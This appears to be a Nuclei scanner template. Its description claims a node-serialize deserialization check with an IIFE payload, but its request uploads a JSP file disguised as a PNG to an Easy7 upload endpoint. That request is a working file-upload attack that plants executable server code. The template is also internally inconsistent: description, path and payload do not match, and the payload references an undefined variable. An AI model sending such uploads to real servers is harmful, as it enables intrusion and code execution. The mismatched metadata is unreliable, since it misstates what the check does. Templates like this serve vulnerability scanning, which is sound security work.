id: easy7-upload

info:
  name: node-serialize <= 0.0.4 - Local Lab Detection (no OAST)
  author: kylew1004
  severity: critical
  description: |
    Local lab check for node-serialize <= 0.0.4 at /api/deserialize.
    It sends an IIFE payload and expects the lab app to return {"ok":true}.
  tags: easy7
variables:
  rand_string: "{{to_lower(rand_base(5))}}"
  rand_value: "{{to_lower(rand_text_alpha(5))}}"
http:
  - raw:
      - |
        POST /Easy7/rest/file/uploadLedImage?objId=1&width=0&height=0 HTTP/1.1
        Host: {{Hostname}}
        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

        ------WebKitFormBoundary
        Content-Disposition: form-data; name="file"; filename="1.jsp"
        Content-Type: image/png

        <%out.println("{{string}}");%>
        ------WebKitFormBoundary--
    matchers:
      - type: dsl
        dsl:
          - status_code == 200

